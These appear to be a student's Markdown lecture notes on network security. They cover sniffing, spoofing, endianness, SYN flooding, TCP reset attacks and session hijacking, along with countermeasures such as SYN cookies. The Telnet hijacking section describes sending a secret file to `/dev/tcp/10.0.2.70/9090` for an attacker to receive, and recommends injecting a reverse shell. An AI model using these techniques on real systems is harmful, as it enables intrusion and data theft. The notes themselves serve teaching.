# Network Security

## Packet Sniffing and Spoofing

### How are Packets Recieved
- Machines connected to network with network interface card (NIC)
- NIC has a unique MAC address
- Each NIC hears all frames on the wire
- Only copies into buffer and dispatched to OS if match is found
![alt text](imgs/network_security/image.png)

#### Promiscuous Mode
- Noramlly frames that are not detinied to a given NIC are discarded
- Promiscuous mode: every frame recieved is passed to kernel
- Sniffer program then registered with kernal and is able to see all packets
- Usually requires root

#### Wireless - Monitor Mode
- WiFi called: Monitor mode
- However, as interference, WiFi card cant copy everything (too much data)
- Wifi operates on channels
- Only monitors on given channel


### Filtering
- Normally only interested in certain types of packets (so can filter out)
- Could first capture all and then discard unwanted, but this is inefficient
- Better to **filter unwanted packets** as **early as possible**

#### BSD Packet Filter (BPF)
- Allows user program to attach a filter to the socket
- Tells the kernel to discard unwanted packets
- ![alt text](imgs/network_security/image-1.png)

### Packet Sniffing
- Describes the process of caputring live data as they flow across network

#### PCAP API
- Recieving data with socket is not portable
- Setting filtes is not easy
- PCAP API is a portable API for capturing packets
  - Uses raw sockets internally, but API standard across all platforms
  - Allows to set filters using boolean expressions


### Packet Spoofing
- Critical information in a packet is forged
- Many network attacks use packet spoofing
- EG, change IP header and change source and destination addres.
- Or UDP can cahnge UDP data

#### Implementation
- Python + Scapy
  - Pros: constructing packets is very simple
  - Cons: Muchc slower than C code
- C (using raw socket)
  - Pros: faster than python
  - Cons: more difficult to construct packets
- Hybrid Approach
  - Use scapy to construct packets
  - Use c to slightly modify packets and then send

### Endianess
- Order in which multi-byte data is  stored in memory
- **Little Endian** - put the small end in memory first
- **Big Endian** - put the big end in memory first
- Most x86 systems are little endian
- AVR32, IBM, mainframes etc use big endian
![alt text](imgs/network_security/image-2.png)


#### Endianness in Network Communciation
- Computers with different endianness could misunderstand communcation
- Therefore use **network order** which si the same as **big endian**
- All computers convert between host order and network order
![alt text](imgs/network_security/image-3.png)


## TCP Attacks
TCP = Transmission Control Protocol
- Above Ip layer and transport layer
- Host to host communcation services
- Reliabel and ordered communaction
- (UDP is lightweight with lower overhead, used for applications that do not require reliability)

### Data Transmission
- Allocates buffers for data, splits up into packets
- Data has a sequence number, used to reorder packets
- Usually application blocking read, waiting to recieve
  
![alt text](imgs/network_security/image-4.png)

### TCP header
![alt text](imgs/network_security/image-5.png)
- Data and fields with information

### TPC 3 Way Handshake
- Syn packet: sends random genearted x as sequence number
- Syn-ack packet: sends reply packet using own random number y and ACK with x+1
- ACK packet: sends ACK with y+1 and sequence x+1

![alt text](imgs/network_security/image-6.png)

- When server recieves first SYN packet, it uses TCB (transmission control block) to store information about the connection
- **half open** connection
- Stores ina  queue
- When ACK packet is received, the connection is established, taken out of queu.
- If no ACK packet is received, the server will wait for a while and resent SYN ACK.
- After a while will be discarded.

#### SYN Flooding
- Idea to fill the queu with half open connetions
- So that no new syn packets can be reiceved.
- Continuously send SYN packets (with no ACK packets)
- ![alt text](imgs/network_security/image-7.png)
- Can use random source IP address to make it harder to block
- IP address may not beassigned, so could be dropped as RST picket is sent out
  - Less likely to happen so overall most stay in the queue.

##### Countermeaures SYN Cookies
- After SYN packet is recieved, server calcualtes keyed hash (H) from inoformation in the packet and secret key (server)
- The hash is sent to the client as the initial sequemce number
- Server not store the half oepn connection in its queue
- If the client is an attacker,H will not reach the attacker
- If the client is not an attacker, it sends H+1 in the AK field
- The server cheks and if correct, it will create the connection

![alt text](imgs/network_security/image-8.png)

### Closing TCP Protocols
- TCP Fin (civilised)
  - A sends a FIN packet with seq x to B
  - B sends back an ACK packet with seq x+1
  - This ends A-B connection
  - B sends a FIN packet with seq y to A
  - A sends back an ACK packet with seq y+1
  - Entire connection is closed 
- TCP RST (uncivilised)
  - One parties sends RST packet to immediatly break the connection
  - For cases of error or emergancy

#### TCP Reset Attack
- Goal to brak TCP connection
- ![alt text](imgs/network_security/image-9.png)
- ![alt text](imgs/network_security/image-10.png)
- Use wireshark to capture packets
- Get sequence number 
- Can now send spoofed RST packet to the server and end connection

#### TCP Reset on SSH
- If encryption is done at network layer
  - Entire TCP packet (including header) is encrypted, cannot sniff and spoof
- But SSH encrpts at transport layer
- So TCP header remains unecrpyted
- So can sniff and spoof

#### TCP Reset on Video Streaming
- Similar to previous
- The seq numbers increases very quickly!
- `netwox` tool, resets each packet that comes from the user machine. 
- Note: if RST packets are sent to a server, could be suspicious and could be blocked
- So better to send RST packets to the client

### TCP Session Hijacking
- Goal to inject data in an estabilished TCP connection
- ![alt text](imgs/network_security/image-11.png)
- Need correct:
  - Source IP, source port
  - Destination IP, destination port
  - Sequence number (within reciever window)
- If the reciever hasalready recieved some data up to sequence number x, the next sequence number will be x+1. If the spoofed packet uses sequence $x+\delta$, becomes out of order
- The data in this packet will be sored in buffer at $x+\delta$ leaving $\delta$ bytes of space.
- If \delta is large, the data will be discarded
![alt text](imgs/network_security/image-12.png) 

#### Hijacking Telnet
- Hikacking telent can run arbitrary commands
- Use `cat` to pipe out "secret file" to a file such as `/dev/tcp/10.0.2.70/9090`
- Can be lisented to by attacker

![alt text](imgs/network_security/image-13.png)

- Can freeze the user program
- As server not acknowledging the packets, so new packets are not sent
- Many retransmission packets
- **Deadlock**
  - Client regards pakcets as out of order
  - Tries retransmission
  - Server regards packets as duplicates
  - Discards packets


#### Reverse Shell
- Best command to run is reverse shell
- So shlell is passed to the attacker
- Can do whatever 
![alt text](imgs/network_security/image-14.png)


#### TCP Countermeasures
- Make it difficult for attackers to spoof packets
  - Randomis source port
  - Randomise initial sequence number
  - Not effective against local attacks
- Encrypting payload
  - Mitages TCP session hijacking
  - But not effective against SYN flooding and TCP reset attacks. 